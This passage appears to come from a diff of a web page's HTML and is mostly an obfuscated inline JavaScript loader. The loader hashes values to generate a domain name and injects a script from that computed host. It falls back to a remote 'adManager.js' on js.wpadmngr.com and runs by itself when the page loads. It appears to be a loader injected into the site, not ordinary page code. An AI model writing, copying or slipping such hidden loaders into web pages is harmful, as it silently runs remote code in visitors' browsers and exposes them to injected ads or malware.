dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
